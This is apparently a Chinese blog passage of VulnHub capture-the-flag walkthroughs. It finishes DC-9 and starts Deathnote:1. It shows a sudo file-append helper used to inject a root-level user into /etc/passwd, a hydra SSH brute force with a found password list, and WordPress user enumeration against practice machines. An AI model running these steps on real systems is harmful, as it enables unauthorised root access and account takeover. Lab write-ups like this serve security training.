<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="regexp">/opt/</span>devstuff<span class="regexp">/dist/</span>test/test</span><br></pre></td></tr></table></figure>

<p>我们执行一下试试</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo <span class="regexp">/opt/</span>devstuff<span class="regexp">/dist/</span>test/test</span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221104170533241.png"><img src="/vulnhub/image-20221104170533241.png" alt="image-20221104170533241"></a></p>
<p>提示我们有个test.py正在被读取使用</p>
<p>我们找一下这个文件在哪里</p>
<blockquote>
<p><code>find / -name &quot;test.py&quot; -type f 2&gt;/dev/null</code></p>
<p><code>-type</code> f代表类型为文件，d为目录<br><code>2&gt;/dev/null</code>产生更清晰的输出，因为它会丢弃错误，例如权限错误</p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221104170743086.png"><img src="/vulnhub/image-20221104170743086.png" alt="image-20221104170743086"></a></p>
<p>我们到文件目录下查看一下内容</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221104170808449.png"><img src="/vulnhub/image-20221104170808449.png" alt="image-20221104170808449"></a></p>
<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/<span class="keyword">python</span></span><br><span class="line"></span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span> (sys.<span class="built_in">argv</span>) != <span class="number">3</span> :</span><br><span class="line">    <span class="keyword">print</span> (<span class="string">&quot;Usage: python test.py read append&quot;</span>)</span><br><span class="line">    sys.<span class="keyword">exit</span> (<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span> :</span><br><span class="line">    <span class="keyword">f</span> = <span class="keyword">open</span>(sys.<span class="built_in">argv</span>[<span class="number">1</span>], <span class="string">&quot;r&quot;</span>)</span><br><span class="line">    output = (<span class="keyword">f</span>.<span class="keyword">read</span>())</span><br><span class="line"></span><br><span class="line">    <span class="keyword">f</span> = <span class="keyword">open</span>(sys.<span class="built_in">argv</span>[<span class="number">2</span>], <span class="string">&quot;a&quot;</span>)</span><br><span class="line">    <span class="keyword">f</span>.<span class="keyword">write</span>(output)</span><br><span class="line">    <span class="keyword">f</span>.<span class="keyword">close</span>()</span><br></pre></td></tr></table></figure>

<h3 id="py脚本利用"><a href="#py脚本利用" class="headerlink" title="py脚本利用"></a>py脚本利用</h3><p><code>脚本接受了两个位置参数，并将第一个文件的内容，附加到第二个文件的内容中</code></p>
<p>其实如果我们有修改脚本的权限就好了，可以改成恶意脚本，但是我们并没有在这个目录写入的权限</p>
<p>于是，我们可以换个思路，就利用脚本的把一个文本内容附加到另外文本的能力，修改我们无法修改的文件，比如<code>/etc/passwd</code></p>
<p>我们先看看<code>/etc/passwd</code>里<code>root</code>用户的格式</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221104171635506.png"><img src="/vulnhub/image-20221104171635506.png" alt="image-20221104171635506"></a></p>
<p>按这个格式我们写一个自己的</p>
<blockquote>
<p><code>ttoc::0:0:root:/root:/bin/bash</code><br>我这里设置的用户ttoc密码为空</p>
</blockquote>
<hr>
<h4 id="openssl加盐"><a href="#openssl加盐" class="headerlink" title="openssl加盐"></a><code>openssl</code>加盐</h4><p>其实这里是需要给我们真假的用户添加密码的</p>
<p>不然是通过不了密码输入那一环，那里不允许密码为空</p>
<p>我们执行</p>
<blockquote>
<p><code>openssl passwd -1 -salt salt password</code></p>
<p><code>-1</code>使用什么哈希算法。在我们的用例中，这无关紧要，因此我们使用 MD5，在现实世界的 PT 中应该避免使用 MD5，因为它不安全。</p>
<p><code>-salt</code> salt用作盐的字符串。我选择字符串盐</p>
<p><code>password</code>我们想使用的明文密码</p>
</blockquote>
<p>得到</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$1</span><span class="variable">$salt</span><span class="variable">$qJH7</span>.N4xYta3aEG<span class="regexp">/dfqo/</span><span class="number">0</span></span><br></pre></td></tr></table></figure>

<p><strong>注意如果开始没加密码就传入&#x2F;etc&#x2F;passwd，后面修改后再传用户，名字不能相同</strong></p>
<hr>
<p>但是注意我们其实在很多目录下都没有写入权限，但是我们可以用经典使用</p>
<p><code>/tmp</code>，临时文件目录下的权限管控一般不大</p>
<p>于是我们把我们的内容写入<code>/tmp</code>目录下的<code>evil</code>文件中</p>
<blockquote>
<p><code>echo &#39;ttoc:$1$salt$qJH7.N4xYta3aEG/dfqo/0:0:0:root:/root:/bin/bash&#39; &gt; /tmp/evil</code></p>
<p>*注意这里需要单引号，双引号会把$后面参数当作变量</p>
</blockquote>
<p>然后我们再执行</p>
<blockquote>
<p><code>sudo /opt/devstuff/dist/test/test /tmp/evil /etc/passwd</code></p>
<p>把我们创建的用户root添加到文本去</p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221104172732031.png"><img src="/vulnhub/image-20221104172732031.png" alt="image-20221104172732031"></a></p>
<p>最后登录<code>ttoc</code></p>
<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">su ttoc</span></span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221104173707687.png"><img src="/vulnhub/image-20221104173707687.png" alt="image-20221104173707687"></a></p>
<p>成功提取</p>
<p>读取<code>flag</code></p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221104173836066.png"><img src="/vulnhub/image-20221104173836066.png" alt="image-20221104173836066"></a></p>
<blockquote>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">███╗   ██╗██╗ ██████╗███████╗    ██╗    ██╗ ██████╗ ██████╗ ██╗  ██╗██╗██╗██╗</span><br><span class="line">████╗  ██║██║██╔════╝██╔════╝    ██║    ██║██╔═══██╗██╔══██╗██║ ██╔╝██║██║██║</span><br><span class="line">██╔██╗ ██║██║██║     █████╗      ██║ █╗ ██║██║   ██║██████╔╝█████╔╝ ██║██║██║</span><br><span class="line">██║╚██╗██║██║██║     ██╔══╝      ██║███╗██║██║   ██║██╔══██╗██╔═██╗ ╚═╝╚═╝╚═╝</span><br><span class="line">██║ ╚████║██║╚██████╗███████╗    ╚███╔███╔╝╚██████╔╝██║  ██║██║  ██╗██╗██╗██╗</span><br><span class="line">╚═╝  ╚═══╝╚═╝ ╚═════╝╚══════╝     ╚══╝╚══╝  ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝╚═╝╚═╝</span><br><span class="line"><span class="code">                                                                             </span></span><br><span class="line"><span class="code"></span></span><br></pre></td></tr></table></figure>

<p><code>Congratulations - you have done well to get to this point.</code></p>
<p><code>Hope you enjoyed DC-9.  Just wanted to send out a big thanks to all those</code><br><code>who have taken the time to complete the various DC challenges.</code></p>
<p><code>I also want to send out a big thank you to the various members of @m0tl3ycr3w .</code></p>
<p><code>They are an inspirational bunch of fellows.</code></p>
<p><code>Sure, they might smell a bit, but...just kidding.  :-)</code></p>
<p><code>Sadly, all things must come to an end, and this will be the last ever</code><br><code>challenge in the DC series.</code></p>
<p><code>So long, and thanks for all the fish.</code></p>
<p>意思是：<br>恭喜 - 你已经完成了这一点。</p>
<p>希望你喜欢 DC-9。只是想对所有这些人表示衷心的感谢<br>他们花时间完成了各种 DC 挑战。</p>
<p>我还要向@m0tl3ycr3w 的各个成员表示衷心的感谢。</p>
<p>他们是一群鼓舞人心的人。</p>
<p>当然，它们可能会闻到一点味道，但是……开玩笑。 :-)</p>
<p>可悲的是，一切都必须结束，这将是最后一次<br>DC系列中的挑战。</p>
<p>这么久，感谢所有的鱼。</p>
</blockquote>
<p><strong>一个旗子找完，游戏结束</strong></p>
<p>【dc系列结束，阅读到本文的朋友，希望对你们有所帮助】</p>
<hr>
<h1 id="ELSE"><a href="#ELSE" class="headerlink" title="ELSE"></a>ELSE</h1><h1 id="一、DEATHNOTE-1-初级"><a href="#一、DEATHNOTE-1-初级" class="headerlink" title="一、DEATHNOTE: 1[初级]"></a>一、DEATHNOTE: 1[初级]</h1><p>基拉好帅，必须拿这个开头，直接提权进他的心【不是南通】</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221106151711523.png"><img src="/vulnhub/image-20221106151711523.png" alt="image-20221106151711523"></a></p>
<blockquote>
<p>hint:<br>不要浪费太多时间跳出框框思考。这是一个直截了当的盒子。</p>
</blockquote>
<hr>
<p>找这个靶场<code>ip</code>，就把我卡住了，后面看到好像这个靶机和<code>vm</code>不兼容，只能用<code>vitrualbox</code></p>
<p>后面下了个<code>vitrualbox</code>才找到靶机<code>ip</code></p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221108134734459.png"><img src="/vulnhub/image-20221108134734459.png" alt="image-20221108134734459"></a></p>
<p>然后<code>vm</code>也桥接，就找到了</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221108190437827.png"><img src="/vulnhub/image-20221108190437827.png" alt="image-20221108190437827"></a></p>
<p>顺带补充两个扫描工具【使用自行<code>-h</code>查看】【感觉和<code>nmap</code>差不多】</p>
<blockquote>
<p><code>arp-scan</code>是Kali Linux自带的一款ARP扫描工具。该工具可以进行单一目标扫描，也可以进行批量扫描。批量扫描的时候，用户可以通过CIDR<br>地址范围或者列表文件的方式指定。该工具允许用户定制ARP包，构建非标准数据包。同时，<code>该工具会自动解析Mac地址，给出MAC对应的硬</code><br><code>件厂商，帮助用户确认目标。</code></p>
<p><code>netdiscover</code><br>Netdiscover是一种网络扫描工具，通过ARP扫描发现活动主机，可以通过主动和被动两种模式进行ARP扫描。通过主动发送ARP请求检查网络ARP流量，通过自动扫描模式扫描网络地址。本文介绍Netdiscover的安装和使用方法。</p>
</blockquote>
<hr>
<h2 id="信息收集-9"><a href="#信息收集-9" class="headerlink" title="信息收集"></a>信息收集</h2><p>习惯<code>nmap</code>扫一下</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221108191059284.png"><img src="/vulnhub/image-20221108191059284.png" alt="image-20221108191059284"></a></p>
<blockquote>
<p><code>22</code>端口开放，运行<code>ssh</code><br><code>80</code>端口开放，运行<code>http</code></p>
</blockquote>
<p>然后访问靶机<code>ip</code></p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221108192408036.png"><img src="/vulnhub/image-20221108192408036.png" alt="image-20221108192408036"></a></p>
<p>看到页面显示<code>please wait.....</code></p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221108192756267.png"><img src="/vulnhub/image-20221108192756267.png" alt="image-20221108192756267"></a></p>
<p>然后显示连接失败</p>
<p>看来是需要修改<code>/etc/hosts</code>文件，添加靶机域名和<code>ip</code></p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221108193016082.png"><img src="/vulnhub/image-20221108193016082.png" alt="image-20221108193016082"></a></p>
<p>再次访问靶机<code>ip</code></p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221108193044669.png"><img src="/vulnhub/image-20221108193044669.png" alt="image-20221108193044669"></a></p>
<p>访问成功</p>
<p>我们先查看一下网站的框架</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221108200530705.png"><img src="/vulnhub/image-20221108200530705.png" alt="image-20221108200530705"></a></p>
<blockquote>
<p><code>CMS</code>为<code>wordpress 5.8</code>，很老的版本了，这里肯定有提权的方式</p>
<p>采用脚本为<code>Twiiter Emoji</code>，这是推特的开源库里的引用表情的脚本，不是关键</p>
</blockquote>
<p>我们看到页面有<code>hint</code></p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221108193350489.png"><img src="/vulnhub/image-20221108193350489.png" alt="image-20221108193350489"></a></p>
<blockquote>
<p><code>Find a notes.txt file on server or SEE the L comment</code> </p>
<p>意思是：</p>
<p>找到一个notes.txt 文件服务器上<br>或</p>
<p>看看L的评论 </p>
<p>那我们就可以用dirsearch扫一下，看看能不能找到notes.txt文件在哪里，以及评论网页在哪里</p>
</blockquote>
<p>评论页面我是在首页面中间</p>
<blockquote>
<p><code>i will eliminate you L!</code></p>
</blockquote>
<p>链接跳转找到的，但好像没啥信息，似乎看不到<code>L</code>的评论</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221108204306618.png"><img src="/vulnhub/image-20221108204306618.png" alt="image-20221108204306618"></a></p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span>deathnote.vuln<span class="regexp">/wordpress/i</span>ndex.php<span class="regexp">/2021/</span><span class="number">07</span><span class="regexp">/19/</span>kira/</span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221108204334859.png"><img src="/vulnhub/image-20221108204334859.png" alt="image-20221108204334859"></a></p>
<p>左下角的</p>
<blockquote>
<p><code>my fav line is iamjustic3</code></p>
<p><code>L on i will eliminate you L!</code></p>
<p>我最喜欢的台词是<code>iamjustic3</code><br><code>L</code> 在 ，我会消灭你L! </p>
<p><code>iamjustic3</code>：分开看i am justic 3【我是正义的3】，但好像实际意思，后面看看能不能利用的</p>
<p><code>eliminate</code>：消灭，纯粹单词意思，没啥意义</p>
</blockquote>
<p>我们先用<code>dirsearch</code>扫一下找一下信息</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221108200416113.png"><img src="/vulnhub/image-20221108200416113.png" alt="image-20221108200416113"></a></p>
<h3 id="关键信息"><a href="#关键信息" class="headerlink" title="*关键信息"></a>*关键信息</h3><p>关键登录页面和<code>robots.txt</code>【其他页面没有啥信息】</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span>deathnote.vuln<span class="regexp">/wordpress/</span>wp-login.php</span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221108201422820.png"><img src="/vulnhub/image-20221108201422820.png" alt="image-20221108201422820"></a></p>
<p>爬虫文本</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221108201357084.png"><img src="/vulnhub/image-20221108201357084.png" alt="image-20221108201357084"></a></p>
<blockquote>
<p><code>fuck it my dad</code><br><code>added hint on /important.jpg</code></p>
<p><code>ryuk please delete it</code><br>意思是：<br>x我的爸爸<br>他把暗示藏在了<code>/important.jpg</code>里</p>
<p>ryuk，请删了它</p>
<p>ryuk是基拉的死神，基拉让他删除图片，同时图片也藏有信息<br>虽然我们找到了登录页面，以及用户名，但是还是不知道密码<br>所以还要找密码</p>
</blockquote>
<p>我们先试试我们能不能查看<code>/important.jpg</code></p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221108210813828.png"><img src="/vulnhub/image-20221108210813828.png" alt="image-20221108210813828"></a></p>
<p>发现图片无法显示</p>
<p>看来图片格式有问题，应该是插入了文本什么的</p>
<p>我们用<code>curl</code></p>
<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http:<span class="comment">//deathnote.vuln/important.jpg</span></span><br></pre></td></tr></table></figure>

<p>得到</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221108220741696.png"><img src="/vulnhub/image-20221108220741696.png" alt="image-20221108220741696"></a></p>
<blockquote>
<p><code>i am Soichiro Yagami, light&#39;s father</code><br><code>i have a doubt if L is true about the assumption that light is kira</code></p>
<p><code>i can only help you by giving something important</code></p>
<p><code>login username : user.txt</code><br><code>i don&#39;t know the password.</code><br><code>find it by yourself</code><br><code>but i think it is in the hint section of site</code></p>
<p>意思是：<br>我是光的父亲 八神宗一郎<br>我怀疑 L 关于光是 kira 的假设是否正确</p>
<p>我只能通过提供一些重要的东西来帮助你</p>
<p>登录用户名：<code>user.txt</code><br>我不知道密码。<br>自己找<br>但我认为它在网站的提示部分<br>#<code>user.txt</code>看来需要同样访问找一下<br>#提示部分有密码，看来就是<code>notes.txt</code>文本里了</p>
</blockquote>
<p>那后面就是找一下这两个文本文件在哪里了</p>
<h2 id="1-wpscan"><a href="#1-wpscan" class="headerlink" title="1.wpscan"></a>1.wpscan</h2><p>既然信息不够，那我们就用对应的<code>CMS</code>工具【<code>wpscan</code>】扫一下看看有没有信息</p>
<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan <span class="params">--url</span> http:<span class="string">//deathnote.vuln/wordpress</span> -e u</span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221108204728050.png"><img src="/vulnhub/image-20221108204728050.png" alt="image-20221108204728050"></a></p>
<p>发现<code>kira</code>才是真正的后台用户，那么<code>ryuk</code>可能就是<code>ssh</code>的登录用户，那他的密码是多少呢</p>
<p>这个时候我想起他的留言</p>
<blockquote>
<p>my fav line is <code>iamjustic3</code></p>
<p>L on i will eliminate you L!</p>
</blockquote>
<p>他说他最喜欢的台词是<code>iamjustic3</code></p>
<p>既然是最喜欢的，那最有可能拿来当密码。所以这个可能就是<code>kira</code>的后台网站的登陆密码</p>
<h3 id="登录后台"><a href="#登录后台" class="headerlink" title="登录后台"></a>登录后台</h3><blockquote>
<p><code>kira</code><br><code>iamjustic3</code></p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221108205228054.png"><img src="/vulnhub/image-20221108205228054.png" alt="image-20221108205228054"></a></p>
<p>登录成功</p>
<p>这个页面提醒需要管理员邮箱验证，直接<code>remind me later</code>，我们先到后台看看</p>
<p>进来后台发现<code>comments</code>页面，先看看能不能看到<code>L</code>的评论</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221108205526638.png"><img src="/vulnhub/image-20221108205526638.png" alt="image-20221108205526638"></a></p>
<p>发现同样啥也没有</p>
<h2 id="2-ssh登录-1"><a href="#2-ssh登录-1" class="headerlink" title="2.ssh登录"></a>2.ssh登录</h2><p>我们再看看其他页面</p>
<p>在<code>Media</code>页面</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221108211543340.png"><img src="/vulnhub/image-20221108211543340.png" alt="image-20221108211543340"></a></p>
<p>我们发现了<code>notes.txt</code></p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221108211618643.png"><img src="/vulnhub/image-20221108211618643.png" alt="image-20221108211618643"></a></p>
<p>点开得到<code>notes.txt</code>文本的位置</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span>deathnote.vuln<span class="regexp">/wordpress/</span>wp-content<span class="regexp">/uploads/</span><span class="number">2021</span><span class="regexp">/07/</span>notes.txt</span><br></pre></td></tr></table></figure>

<p>访问得到</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221108211705028.png"><img src="/vulnhub/image-20221108211705028.png" alt="image-20221108211705028"></a></p>
<p>看起来很像密码本</p>
<blockquote>
<p><code>death4</code><br><code>death4life</code><br><code>death4u</code><br><code>death4ever</code><br><code>death4all</code><br><code>death420</code><br><code>death45</code><br><code>death4love</code><br><code>death49</code><br><code>death48</code><br><code>death456</code><br><code>death4014</code><br><code>1death4u</code><br><code>yaydeath44</code><br><code>thedeath4u2</code><br><code>thedeath4u</code><br><code>stickdeath420</code><br><code>reddeath44</code><br><code>megadeath44</code><br><code>megadeath4</code><br><code>killdeath405</code><br><code>hot2death4sho</code><br><code>death4south</code><br><code>death4now</code><br><code>death4l0ve</code><br><code>death4free</code><br><code>death4elmo</code><br><code>death4blood</code><br><code>death499Eyes301</code><br><code>death498</code><br><code>death4859</code><br><code>death47</code><br><code>death4545</code><br><code>death445</code><br><code>death444</code><br><code>death4387n</code><br><code>death4332387</code><br><code>death42521439</code><br><code>death42</code><br><code>death4138</code><br><code>death411</code><br><code>death405</code><br><code>death4me</code></p>
</blockquote>
<p>我们试试爆破<code>ssh</code></p>
<p>我们再弄个用户名本</p>
<blockquote>
<p>就拿我们已知的三个用户，做成用户名本<br><code>kira</code><br><code>l</code><br><code>ryku</code></p>
</blockquote>
<p>然后九头蛇爆破登录<code>ssh</code></p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">hydra</span> -L un.txt -P pass.txt <span class="number">192.168.163.123</span> ssh -s <span class="number">22</span></span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221108213915226.png"><img src="/vulnhub/image-20221108213915226.png" alt="image-20221108213915226"></a></p>
<p>发现登录用户【看来用不上去找那个<code>user.txt</code>】</p>
<blockquote>
<p><code>l</code><br><code>death4me</code></p>
</blockquote>
<p>然后我们试试登录</p>
<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">ssh</span> l@<span class="number">192.168.16.123</span> </span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221108214049547.png"><img src="/vulnhub/image-20221108214049547.png" alt="image-20221108214049547"></a></p>
<p>登录成功，并看到当前目录下有个文本文件<code>user.txt</code>【无奈，现在找到应该也没啥用了】</p>
<p>查看一下</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221108214257074.png"><img src="/vulnhub/image-20221108214257074.png" alt="image-20221108214257074"></a></p>
<p>发现是串看不懂的文本</p>
<p>我们试试<code>ciphey</code>解密一下</p>
<figure class="highlight brainfuck"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">ciphey</span> <span class="literal">-</span><span class="comment">t &quot;</span><span class="literal">++++++++++</span><span class="title">[</span>&gt;<span class="literal">+</span>&gt;<span class="literal">+++</span>&gt;<span class="literal">+++++++</span>&gt;<span class="literal">++++++++++</span>&lt;&lt;&lt;&lt;<span class="literal">-</span><span class="title">]</span>&gt;&gt;&gt;&gt;<span class="literal">+++++</span><span class="string">.</span>&lt;&lt;<span class="literal">++</span><span class="string">.</span>&gt;&gt;<span class="literal">+++++++++++</span><span class="string">.</span><span class="literal">------------</span><span class="string">.</span><span class="literal">+</span><span class="string">.</span><span class="literal">+++++</span><span class="string">.</span><span class="literal">---</span><span class="string">.</span>&lt;&lt;<span class="string">.</span>&gt;&gt;<span class="literal">++++++++++</span><span class="string">.</span>&lt;&lt;<span class="string">.</span>&gt;&gt;<span class="literal">--------------</span><span class="string">.</span><span class="literal">++++++++</span><span class="string">.</span><span class="literal">+++++</span><span class="string">.</span>&lt;&lt;<span class="string">.</span>&gt;&gt;<span class="string">.</span><span class="literal">------------</span><span class="string">.</span><span class="literal">---</span><span class="string">.</span>&lt;&lt;<span class="string">.</span>&gt;&gt;<span class="literal">++++++++++++++</span><span class="string">.</span><span class="literal">-----------</span><span class="string">.</span><span class="literal">---</span><span class="string">.</span><span class="literal">+++++++</span><span class="string">.</span><span class="string">.</span>&lt;&lt;<span class="string">.</span><span class="literal">++++++++++++</span><span class="string">.</span><span class="literal">------------</span><span class="string">.</span>&gt;&gt;<span class="literal">----------</span><span class="string">.</span><span class="literal">+++++++++++++++++++</span><span class="string">.</span><span class="literal">-</span><span class="string">.</span>&lt;&lt;<span class="string">.</span>&gt;&gt;<span class="literal">+++++</span><span class="string">.</span><span class="literal">----------</span><span class="string">.</span><span class="literal">++++++</span><span class="string">.</span>&lt;&lt;<span class="string">.</span>&gt;&gt;<span class="literal">++</span><span class="string">.</span><span class="literal">--------</span><span class="string">.</span><span class="literal">-</span><span class="string">.</span><span class="literal">++++++</span><span class="string">.</span>&lt;&lt;<span class="string">.</span>&gt;&gt;<span class="literal">------------------</span><span class="string">.</span><span class="literal">+++</span><span class="string">.</span>&lt;&lt;<span class="string">.</span>&gt;&gt;<span class="literal">----</span><span class="string">.</span><span class="literal">+</span><span class="string">.</span><span class="literal">++++++++++</span><span class="string">.</span><span class="literal">-------</span><span class="string">.</span>&lt;&lt;<span class="string">.</span>&gt;&gt;<span class="literal">+++++++++++++++</span><span class="string">.</span><span class="literal">-----</span><span class="string">.</span>&lt;&lt;<span class="string">.</span>&gt;&gt;<span class="literal">----</span><span class="string">.</span><span class="literal">--</span><span class="string">.</span><span class="literal">+++</span><span class="string">.</span><span class="string">.</span>&lt;&lt;<span class="string">.</span>&gt;&gt;<span class="literal">+</span><span class="string">.</span><span class="literal">--------</span><span class="string">.</span>&lt;&lt;<span class="string">.</span><span class="literal">+++++++++++++</span><span class="string">.</span>&gt;&gt;<span class="literal">++++++</span><span class="string">.</span><span class="literal">--</span><span class="string">.</span><span class="literal">+++++++++</span><span class="string">.</span><span class="literal">-----------------</span><span class="string">.</span></span><br><span class="line"><span class="comment">&quot;</span></span><br></pre></td></tr></table></figure>

<p>得到</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221108221734407.png"><img src="/vulnhub/image-20221108221734407.png" alt="image-20221108221734407"></a></p>
<blockquote>
<p><code>i think u got the shell , but you wont be able to kill me -kira</code><br>意思是：<br>我想你已经拿到shell了，但你杀不了我-基拉</p>
</blockquote>
<p>感觉信息没啥用，但是大概猜测，杀死基拉是需要提权的，但是从L这里是无法提权，只有基拉才可以提权</p>
<p>我们可以试试我们能否以管理员身份执行一些命令</p>
<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">sudo -l</span></span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221108222201419.png"><img src="/vulnhub/image-20221108222201419.png" alt="image-20221108222201419"></a></p>
<p> 这样看来<code>L</code>是无法以管理员身份执行任何命令，那就只有看看有没有其他路径了</p>
<p>我们再输入</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">pwd</span></span><br></pre></td></tr></table></figure>

<p>看看我们当前路径</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221108214344792.png"><img src="/vulnhub/image-20221108214344792.png" alt="image-20221108214344792"></a></p>
<p>发现我们还有个上级目录，返回查看其下目录</p>
<p>居然还有个<code>kira</code>的目录</p>
<p>我们看看有什么</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221108214506480.png"><img src="/vulnhub/image-20221108214506480.png" alt="image-20221108214506480"></a></p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221108214544456.png"><img src="/vulnhub/image-20221108214544456.png" alt="image-20221108214544456"></a></p>
<p>发现其目录下的<code>kira.txt</code>设置了权限</p>
<p>我们尝试用之前后台登录的密码登录，也失败了</p>
<h2 id="3-登录kira"><a href="#3-登录kira" class="headerlink" title="3.登录kira"></a>3.登录kira</h2><p>看来我们还需要找找信息，根据<code>user.txt</code>文本信息，我们必须要成功登录<code>kira</code>的用户，才可以提权拿到我们想要的东西</p>
<p>那我们直接搜索当前全部含有kira的文件或者目录</p>
<figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">find</span> / -name <span class="string">&quot;kira*&quot;</span> <span class="number">2</span>&gt;<span class="regexp">/dev/</span><span class="literal">null</span></span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221108222721847.png"><img src="/vulnhub/image-20221108222721847.png" alt="image-20221108222721847"></a></p>
<p>前两个前面访问过没权限</p>
<p>后面四个三个图片，最后一个也访问过，也没权限</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221108222833431.png"><img src="/vulnhub/image-20221108222833431.png" alt="image-20221108222833431"></a></p>
<p>那就只有一个了</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/opt/L/kira-case</span><br></pre></td></tr></table></figure>

<p>我们查看一下有无信息</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221108223018151.png"><img src="/vulnhub/image-20221108223018151.png" alt="image-20221108223018151"></a></p>
<p>发现其为一个目录，且其下有一个文本文件</p>
<blockquote>
<p><code>the FBI agent died on December 27, 2006</code></p>
<p><code>1 week after the investigation of the task-force member/head.</code><br><code>aka.....</code><br><code>Soichiro Yagami&#39;s family .</code></p>
<p><code>hmmmmmmmmm......</code><br><code>and according to watari ,</code><br><code>he died as other died after Kira targeted them .</code></p>
<p><code>and we also found something in</code><br><code>fake-notebook-rule folder .</code><br>意思是：</p>
<p>联邦调查局特工于 2006 年 12 月 27 日去世</p>
<p>工作组成员&#x2F;负责人调查后 1 周。<br>又名……<br>八神宗一郎的家人。</p>
<p>嗯嗯嗯嗯……<br>根据 Watari 的说法，<br>在基拉瞄准他们之后，他死了，其他人也死了。</p>
<p>我们还发现了一些东西<br>假笔记本规则文件夹</p>
</blockquote>
<p>看来我们需要到<code>fake-notebook-rule</code>这个文件夹下寻找一番</p>
